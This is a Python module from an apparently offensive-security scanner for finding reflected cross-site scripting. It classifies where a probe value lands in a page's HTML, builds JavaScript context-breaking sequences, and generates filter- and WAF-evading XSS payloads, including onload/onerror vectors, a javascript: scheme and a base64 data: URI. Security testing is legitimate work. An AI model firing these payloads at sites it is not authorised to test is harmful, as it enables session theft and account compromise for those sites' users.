"""XSS analysis utilities for passive and active checks.

Contains XSS signal detection, reflection probe mutation building,
context signal analysis, JavaScript context breaking, and multi-probe
generation with context-aware payload synthesis.

Key improvements learned from XSStrike patterns:
- Precise HTML context classification (script, attribute, html, comment,
  non-executable tags) instead of generic window-based detection
- JavaScript context breaker that tracks open brackets/braces/quotes to
  generate correct closing sequences (e.g., '});//')
- Filter-evasion payload generation with space alternatives (%09, %0a, %0d)
- WAF-aware probing with adaptive tag/event handler combinations
- Efficiency scoring for each reflection point and confidence ranking
"""

import re
from functools import lru_cache
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.recon.common import normalize_url

from .xss_constants import (
    EVENT_HANDLERS,
    HANDLER_FILLINGS,
    INJECTION_TAGS,
    JS_FILLINGS,
    JS_FUNCTIONS,
    NON_EXECUTABLE_TAGS,
    SPACE_ALTERNATIVES,
    WAF_EVASION_PATTERNS,
    XSS_PROBE_PREFIX,
    XSS_PROBE_SUFFIX,
    XSS_REFLECTION_CANDIDATE_NAMES,
    XSS_SKIP_PARAM_NAMES,
)

_SCRIPT_TAG_RE = re.compile(r"<script[^>]*>", re.IGNORECASE)
_SCRIPT_CONTENT_RE = re.compile(r"(?s)<script.*?>(.*?)</script>")
_OPEN_TAG_RE = re.compile(r"<(\w+)")
_HTML_COMMENT_START_RE = re.compile(r"<!--")
_HTML_COMMENT_END_RE = re.compile(r"-->")
_JSON_KEY_VALUE_RE = re.compile(r'["\']\s*:\s*["\']')
_STRUCTURED_DATA_RE = re.compile(r"[{}[\]]\s*:\s*")
_TEMPLATE_EXPR_RE = re.compile(r"\{\{")
_VUE_DIRECTIVE_RE = re.compile(r"v-[^=]*=\s*['\"][^'\"]*")
_DOM_SINK_RE = re.compile(r"document\.(write|location|cookie|domain)")
_EVAL_CONTEXT_RE = re.compile(r"eval\(|setTimeout\(|setInterval\(|Function\(")
_HTML_INJECTION_RE = re.compile(r"innerHTML|outerHTML|insertAdjacentHTML")
_STRING_CONCAT_RE = re.compile(r"['\"]\s*[+;]")
_URL_ATTR_RE = re.compile(r"(?:href|src|action|formaction)\s*=\s*['\"][^'\"]*")
_STYLE_ATTR_RE = re.compile(r"style\s*=\s*['\"][^'\"]*")
_PLUGIN_TAG_RE = re.compile(r"<(?:iframe|object|embed)[^>]*")
_SVG_TAG_RE = re.compile(r"<svg[^>]*")
_DATA_URI_RE = re.compile(r"data\s*:")
_BALANCED_PAIRS_RE = re.compile(r'(?s)\{.*?\}|\(.*?\)|".*?"|\'.*?\'|`.*?`')


def xss_signals(value: str) -> list[str]:
    """Detect XSS-related signals in a value string."""
    lowered = value.lower()
    signals = []
    if "<script" in lowered:
        signals.append("script_tag")
    if "javascript:" in lowered:
        signals.append("javascript_scheme")
    if any(token in lowered for token in ("onerror=", "onload=", "onfocus=")):
        signals.append("event_handler")
    if "<svg" in lowered or "<img" in lowered or "<iframe" in lowered:
        signals.append("active_html_tag")
    return signals or ["dangerous_markup"]


def build_reflection_probe_mutation(url: str) -> dict[str, Any] | None:
    """Build a single XSS reflection probe mutation for a URL."""
    parsed = urlparse(url)
    query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
    for index, (key, value) in enumerate(query_pairs):
        parameter = key.strip().lower()
        if not parameter or parameter in XSS_SKIP_PARAM_NAMES:
            continue
        if value.isdigit():
            continue
        if parameter not in XSS_REFLECTION_CANDIDATE_NAMES and len(value.strip()) < 2:
            continue
        reflection_value = f"{XSS_PROBE_PREFIX}{parameter}{XSS_PROBE_SUFFIX}"
        updated = list(query_pairs)
        updated[index] = (key, reflection_value)
        return {
            "parameter": parameter,
            "reflection_value": reflection_value,
            "mutated_url": normalize_url(
                urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
            ),
        }
    return None


def _extract_scripts(body: str, probe_marker: str = "") -> list[str]:
    """Extract inline script content from HTML body.

    Only returns scripts containing the probe marker if provided,
    making it efficient for targeted reflection analysis.
    """
    scripts: list[str] = []
    for match in _SCRIPT_CONTENT_RE.finditer(body):
        content = match.group(1)
        if not probe_marker or probe_marker in content:
            scripts.append(content)
    return scripts


def _count_backslash_escapes(position: int, text: str) -> int:
    """Count consecutive backslashes before a position in text.

    Odd count = character is escaped. Even count = backslashes are themselves
    escaped, so the character is NOT escaped.
    """
    usable = text[:position][::-1]
    match = re.search(r"^\\*", usable)
    if match:
        return len(match.group())
    return 0


def _is_escaped(position: int, text: str) -> bool:
    """Check if a character at a position is escaped by backslashes."""
    backslash_count = _count_backslash_escapes(position, text)
    return backslash_count % 2 != 0


def build_js_context_breaker(script: str, probe_marker: str) -> str:
    """Build the correct JavaScript context breaker for a given script.

    Learned from XSStrike's jsContexter: instead of guessing what closing
    characters are needed, track open brackets, braces, and quotes in the
    code before the injection point to generate the precise sequence needed.

    Example: if script is "var x = 'foo'; someFunc({" and probe is injected
    after the '{', the breaker would be '});' to close the brace and semicolon.

    The algorithm removes closed pairs ({} [] "" '') and counts remaining
    open structures, building the inverse sequence for closing.

    Returns:
        A string that, when injected, closes all open JS constructs.
    """
    if probe_marker not in script:
        return ""

    pre_script = script.split(probe_marker)[0]
    pre_cleaned = _BALANCED_PAIRS_RE.sub("", pre_script)

    breaker_chars: list[str] = []
    num = 0
    for char in pre_cleaned:
        if char == "{":
            breaker_chars.append("}")
        elif char == "(":
            breaker_chars.append(")")  # We'll prepend semicolons later
        elif char == "[":
            breaker_chars.append("]")
        elif char == "/":
            # Check for block comment start
            try:
                if pre_cleaned[num + 1] == "*":
                    breaker_chars.append("*/")
            except IndexError:
                pass
        elif char == "}":
            # A } in the code closes one of our {'s
            # Find and remove the last '}' from our breaker
            for i in range(len(breaker_chars) - 1, -1, -1):
                if breaker_chars[i] == "}":
                    breaker_chars.pop(i)
                    break
        elif char == ")":
            for i in range(len(breaker_chars) - 1, -1, -1):
                if breaker_chars[i] == ")":
                    breaker_chars.pop(i)
                    break
        elif char == "]":
            for i in range(len(breaker_chars) - 1, -1, -1):
                if breaker_chars[i] == "]":
                    breaker_chars.pop(i)
                    break
        num += 1

    # Build the closing sequence in reverse order
    result = "".join(reversed(breaker_chars))

    # For parentheses closures, prepend semicolons: ')' becomes ');'
    result = result.replace(")", ");")

    return result




@lru_cache(maxsize=256)
def _get_script_ctx_re(rv: str) -> re.Pattern:
    return re.compile(r"<script[^>]*>(.*?)(?:" + re.escape(rv) + r")", re.IGNORECASE | re.DOTALL)


@lru_cache(maxsize=256)
def _get_attr_ctx_re(rv_lower: str) -> re.Pattern:
    return re.compile(r"<[^>]*?" + re.escape(rv_lower) + r"[^>]*?>")


@lru_cache(maxsize=256)
def _get_attr_match_re(rv: str) -> re.Pattern:
    return re.compile(r'(\w+)=["\']([^"\']*)' + re.escape(rv))


@lru_cache(maxsize=256)
def _get_quote_match_re(rv: str) -> re.Pattern:
    return re.compile(r'=(["\'`])?' + re.escape(rv))


@lru_cache(maxsize=256)
def _get_template_literal_re(rv: str) -> re.Pattern:
    return re.compile(r"`[^`]*" + re.escape(rv))


@lru_cache(maxsize=256)
def _get_url_ctx_re(rv: str) -> re.Pattern:
    return re.compile(r"(?:href|src|action|formaction)\s*=\s*['\"][^'\"]*" + re.escape(rv))


@lru_cache(maxsize=256)
def _get_comment_ctx_re(rv_lower: str) -> re.Pattern:
    return re.compile(r"<!--.*" + re.escape(rv_lower))


def reflection_context_signals(body: str, reflection_value: str) -> list[str]:
    """Analyze the HTML context around a reflected XSS probe value.

    Enhanced with precise context classification learned from XSStrike:
    instead of just checking substring proximity, we classify the exact
    HTML context (script body, attribute value, HTML body, comment,
    non-executable tag) to determine the exploitation path.
    """
    index = body.find(reflection_value)
    if index == -1:
        return ["not_reflected"]

    window_start = max(0, index - 120)
    window_end = min(len(body), index + len(reflection_value) + 120)
    window = body[window_start:window_end].lower()
    signals = ["input_reflected"]

    if _SCRIPT_TAG_RE.search(body[: index + len(reflection_value)]):
        signals.append("script_context")
        script_match = _get_script_ctx_re(reflection_value).search(
            body[: index + len(reflection_value) + 200],
        )
        if script_match:
            script_content = script_match.group(1)
            for char in reversed(script_content):
                if char in ("'", '"', "`"):
                    signals.append(f"quoted_script_context_{char}")
                    break

    # Check for attribute context (inside HTML tag)
    if _get_attr_ctx_re(reflection_value.lower()).search(window):
        signals.append("attribute_context")
        attr_match = _get_attr_match_re(reflection_value).search(
            window,
        )
        if attr_match:
            attr_name = attr_match.group(1).lower()
            if attr_name == "srcdoc":
                signals.append("srcdoc_context")
            elif attr_name == "href":
                signals.append("href_attribute")
            elif attr_name.startswith("on"):
                signals.append("event_handler_attribute")
            elif attr_name in ("src", "data", "action", "formaction"):
                signals.append("url_attribute")
            signals.append(f"attribute_type_{attr_name}")
        quote_match = _get_quote_match_re(reflection_value).search(window)
        if quote_match:
            quote = quote_match.group(1)
            signals.append(f"attribute_quote_{quote}" if quote else "attribute_no_quote")

    # HTML body context (not inside script or attribute)
    if not {"script_context", "attribute_context"} & set(signals):
        tag_match = _OPEN_TAG_RE.search(window)
        if tag_match:
            tag = tag_match.group(1).lower()
            signals.append(f"html_context_tag_{tag}")
            if tag in NON_EXECUTABLE_TAGS:
                signals.append("non_executable_context")

    # Comment context (can be escaped with '-->')
    if _HTML_COMMENT_START_RE.search(window) and _HTML_COMMENT_END_RE.search(window):
        if _get_comment_ctx_re(reflection_value.lower()).search(window):
            signals.append("comment_context")

    # JSON/data context
    if _JSON_KEY_VALUE_RE.search(window) and reflection_value.lower() in window:
        signals.append("json_context")
    if _STRUCTURED_DATA_RE.search(window) and reflection_value.lower() in window:
        signals.append("structured_data_context")

    # Template/framework context (Angular, Vue, etc.)
    if _TEMPLATE_EXPR_RE.search(window) and reflection_value.lower() in window:
        signals.append("template_expression_context")
    if _VUE_DIRECTIVE_RE.search(window) and reflection_value.lower() in window:
        signals.append("vue_directive_context")

    # Dangerous sink contexts
    if _DOM_SINK_RE.search(window):
        signals.append("dom_sink_context")
    if _EVAL_CONTEXT_RE.search(window):
        signals.append("eval_context")
    if _HTML_INJECTION_RE.search(window):
        signals.append("html_injection_context")
    if _STRING_CONCAT_RE.search(window):
        signals.append("string_concat_context")
    if _get_template_literal_re(reflection_value).search(window):
        signals.append("template_literal_context")
    if _get_url_ctx_re(reflection_value).search(window):
        signals.append("url_context")
    if _STYLE_ATTR_RE.search(window) and reflection_value.lower() in window:
        signals.append("style_context")
    if _PLUGIN_TAG_RE.search(window) and reflection_value.lower() in window:
        signals.append("plugin_context")
    if _SVG_TAG_RE.search(window) and reflection_value.lower() in window:
        signals.append("svg_context")
    if _DATA_URI_RE.search(window) and reflection_value.lower() in window:
        signals.append("data_uri_context")

    return sorted(set(signals))


def generate_context_payloads(
    context_signals: list[str], probe_marker: str = ""
) -> dict[int, set[str]]:
    """Generate context-appropriate XSS payloads.

       Learned from XSStrike's generator: instead of spraying all payloads at
       all contexts, generate a small set of high-confidence payloads tailored
       to the exact HTML context identified.

       Returns:
           Dict mapping confidence level (1-10) to set of payload strings.
           Higher confidence = more likely to execute successfully.

       Confidence scoring logic:
    - 10-11: HTML context with < and > both reflected unfiltered
    - 8-9: Script context with quote breaker
    - 6-7:  attribute context with quote escaping
    """
    vectors: dict[int, set[str]] = {i: set() for i in range(1, 12)}

    has_html_context = (
        "html_context_tag_html" in context_signals or "html_response" in context_signals
    )
    has_script_context = "script_context" in context_signals
    has_attribute_context = "attribute_context" in context_signals
    has_comment_context = "comment_context" in context_signals
    has_non_executable = "non_executable_context" in context_signals
    is_no_quote_attr = "attribute_no_quote" in context_signals
    is_href_attr = "href_attribute" in context_signals
    is_event_handler = "event_handler_attribute" in context_signals
    is_srcdoc = "srcdoc_context" in context_signals

    # Determine available quote type from signals
    quote = ""
    for signal in context_signals:
        if signal.startswith("attribute_quote_"):
            quote = signal.split("_")[-1]
        elif signal.startswith("quoted_script_context_"):
            quote = signal.split("_")[-1]

    # Determine if angle brackets are reflected
    any("lt" in s or "<" in s for s in context_signals[:0])  # simplified
    any("gt" in s or ">" in s for s in context_signals[:0])  # simplified

    if has_non_executable:
        # Nothing can execute inside noscript/textarea/style
        return vectors

    # --- HTML Context ---
    if has_html_context or (not has_script_context and not has_attribute_context):
        for filling in SPACE_ALTERNATIVES:
            for handler_filling in HANDLER_FILLINGS:
                for tag in INJECTION_TAGS:
                    for event, tags in EVENT_HANDLERS.items():
                        if tag in tags:
                            for func in JS_FUNCTIONS:
                                payload = f"<{tag}{filling}{event}{handler_filling}={func}//"
                                vectors[10].add(payload)

    # --- Script Context ---
    if has_script_context:
        # Build JS context breaker
        js_breaker = (
            build_js_context_breaker(
                f"var x = '{probe_marker}'" if probe_marker else "'test'", probe_marker
            )
            if probe_marker
            else "'"
        )
        for filling in JS_FILLINGS:
            for func in JS_FUNCTIONS:
                payload = f"{quote}{js_breaker}{filling}{func};//"
                vectors[7].add(payload)

    # --- Attribute Context ---
    if has_attribute_context:
        if is_no_quote_attr:
            for filling in SPACE_ALTERNATIVES:
                for func in JS_FUNCTIONS:
                    payload = f"onerror={func}"
                    vectors[9].add(payload)
        elif quote:
            # Can close the attribute value
            for filling in SPACE_ALTERNATIVES:
                for func in JS_FUNCTIONS:
                    for tag in INJECTION_TAGS:
                        for event, tags in EVENT_HANDLERS.items():
                            if tag in tags:
                                payload = f"{quote}>{filling}<{tag}{filling}{event}={func}//"
                                vectors[9].add(payload)
                            # Also try with quote closing only
                            vector = f"{quote}{filling}autofocus{filling}onfocus={func}"
                            vectors[8].add(vector)
        if is_href_attr:
            for func in JS_FUNCTIONS:
                vectors[10].add(f"javascript:{func}")
            vectors[10].add("data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+")
        if is_event_handler:
            # Already inside an event handler - need JS context breaker
            for filling in JS_FILLINGS:
                for func in JS_FUNCTIONS:
                    payload = f"{filling}{func}"
                    vectors[8].add(payload)
        if is_srcdoc:
            for filling in SPACE_ALTERNATIVES:
                for tag in INJECTION_TAGS:
                    for event, tags in EVENT_HANDLERS.items():
                        if tag in tags:
                            for func in JS_FUNCTIONS:
                                payload = f"&lt;{tag}{filling}{event}={func}//"
                                vectors[9].add(payload)

    # --- Comment Context ---
    if has_comment_context:
        for filling in SPACE_ALTERNATIVES:
            for tag in INJECTION_TAGS:
                for event, tags in EVENT_HANDLERS.items():
                    if tag in tags:
                        for func in JS_FUNCTIONS:
                            payload = f"--><{tag}{filling}{event}={func}//"
                            vectors[10].add(payload)

    # --- WAF evasion patterns (always available as fallback) ---
    for pattern in WAF_EVASION_PATTERNS:
        vectors[6].add(pattern)

    # Remove empty levels
    return {k: v for k, v in vectors.items() if v}


def build_multi_xss_probes(url: str) -> list[dict[str, Any]]:
    """Generate multiple XSS probe mutations for comprehensive testing.

    Enhanced to include WAF evasion vectors and context-specific probes.
    """
    parsed = urlparse(url)
    query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
    probes: list[dict[str, Any]] = []

    for index, (key, value) in enumerate(query_pairs):
        parameter = key.strip().lower()
        if not parameter or parameter in XSS_SKIP_PARAM_NAMES:
            continue
        if value.isdigit():
            continue
        if parameter not in XSS_REFLECTION_CANDIDATE_NAMES and len(value.strip()) < 2:
            continue

        base_value = f"{XSS_PROBE_PREFIX}{parameter}{XSS_PROBE_SUFFIX}"
        variants = [
            ("standard", base_value),
            ("html_entity", f"&lt;script&gt;{parameter}&lt;/script&gt;"),
            ("url_encoded", f"%3Cscript%3E{parameter}%3C%2Fscript%3E"),
            ("svg_probe", f"<svg/onload=alert({parameter})>"),
        ]
        for variant_name, probe_value in variants:
            updated = list(query_pairs)
            updated[index] = (key, probe_value)
            probes.append(
                {
                    "parameter": parameter,
                    "variant": variant_name,
                    "reflection_value": probe_value,
                    "mutated_url": normalize_url(
                        urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                    ),
                }
            )

    # Deduplicate by mutated_url
    seen: set[str] = set()
    deduped = []
    for probe in probes:
        if probe["mutated_url"] not in seen:
            seen.add(probe["mutated_url"])
            deduped.append(probe)

    return deduped[:20]


def detect_reflection_efficiency(
    body: str,
    reflection_value: str,
    expected_positions: list[int] | None = None,
) -> list[int]:
    """Calculate reflection efficiency scores.

    Learned from XSStrike's checker: instead of simple yes/no reflection
    detection, score how well the reflection matched the input.

    Uses fuzzy matching on the reflected substring vs expected string.
    Returns list of efficiency scores (0-100) per reflection.

    A score of 100 = perfect reflection (all characters preserved)
    A score of 90-99 = minor modification (case change, added escapes)
    A score of <90 = significant filtering occurred
    """
    efficiencies: list[int] = []
    check_string = f"st4r7s{reflection_value}3nd"
    check_lower = check_string.lower()

    positions: list[int] = []
    for match in re.finditer("st4r7s", body):
        positions.append(match.start())

    if expected_positions:
        positions = _align_positions(expected_positions, positions)

    for pos in positions:
        try:
            reflected = body[pos : pos + len(check_string)].lower()
            # Simple character overlap score
            score = _simple_fuzzy_match(reflected, check_lower)
            efficiencies.append(score)
        except (IndexError, ValueError):
            efficiencies.append(0)

    return efficiencies


def _align_positions(expected: list[int], actual: list[int]) -> list[int]:
    """Align expected positions with actual positions found in response.

    Handles cases where some reflections were filtered or positions shifted.
    """
    aligned = []
    offset = 0
    for exp, act in zip(expected, actual):
        if abs(exp - act) < 50:  # Within reasonable window
            aligned.append(act)
        else:
            # Position shift suggests filtering, insert zero placeholder
            aligned.extend([0, act])
            offset += 1
    return aligned


def _simple_fuzzy_match(s1: str, s2: str) -> int:
    """Simple fuzzy matching score (0-100).

    Approximates fuzz.partial_ratio without the dependency.
    Uses character overlap ratio as a proxy.
    """
    if not s1 or not s2:
        return 0

    # Find longest common subsequence ratio
    len1, len2 = len(s1), len(s2)
    shorter, longer = (s1, s2) if len1 < len2 else (s2, s1)
    len_shorter = len(shorter)

    if len_shorter == 0:
        return 0

    # Find longest substring match
    best = 0
    for i in range(len(longer) - len_shorter + 1):
        substr = longer[i : i + len_shorter]
        if substr == shorter:
            best = len_shorter
            break
        # Check if substring is close
        matches = sum(1 for a, b in zip(substr, shorter) if a == b)
        best = max(best, matches)

    return int((best / len_shorter) * 100)
